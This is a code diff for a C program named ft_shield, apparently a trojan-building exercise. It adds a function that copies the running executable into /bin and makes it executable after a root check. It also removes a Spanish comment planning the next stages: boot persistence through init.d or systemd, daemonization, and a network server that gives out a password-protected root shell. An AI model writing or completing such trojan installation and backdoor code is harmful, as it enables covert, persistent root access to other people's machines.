@@ -1,8 +1,33 @@
 #include "../include/ft_shield.h"
 
+void    ft_payload(t_troyan *shield)
+{
+    shield->fd = fopen("/proc/self/exe", "r");
+    if (!shield->fd)
+    {
+        printf("ERROR: failed to open exe file\n");
+        free(shield);
+        return;
+    }
+    shield->fd_dest = fopen("/bin/ft_shield", "wb");
+    if (!shield->fd_dest)
+    {
+        printf("ERROR: failed to open bin file\n");
+        fclose(shield->fd);
+        free(shield);
+        return;
+    }
+    while ((shield->bytes_read = fread(shield->buffer_exe, 1, 1024, shield->fd)) != 0)
+        fwrite(shield->buffer_exe, 1, shield->bytes_read, shield->fd_dest);
+    printf("( %p )\n", shield->fd_dest);
+    fclose(shield->fd);
+    fclose(shield->fd_dest);
+    chmod("/bin/ft_shield", 0755);
+}
+
 int main()
 {
-    t_troyan *shield;
+    t_troyan    *shield;
 
     shield = malloc(sizeof(t_troyan));
     if (!shield)
@@ -20,29 +45,7 @@ int main()
         return (1);
     }
     printf("%s\n", shield->pwd->pw_name);
+    ft_payload(shield);
     free(shield);
     return (0);
 }
-
-/*
-
-## Paso 1: 
-Crearemos la estructura básica del programa en C para que verifique los permisos de `root` 
-y simplemente imprima nuestro login por pantalla.
-
-## Paso 2: 
-Añadiremos la lógica de clonación (lectura de `/proc/self/exe` 
-y escritura en la ruta del sistema).
- 
-## Paso 3:
-Desarrollaremos el mecanismo de persistencia para el arranque
-(creación del script en `init.d` o el servicio en `systemd`).
-
-## Paso 4:
-Implementaremos la daemonización del proceso y el archivo de bloqueo (*PID lock file*).
-
-## Paso 5:
-Levantaremos el servidor de red con el gestor multicliente e integraremos 
-la seguridad de la contraseña y el despliegue de la shell de root.
-
-*/
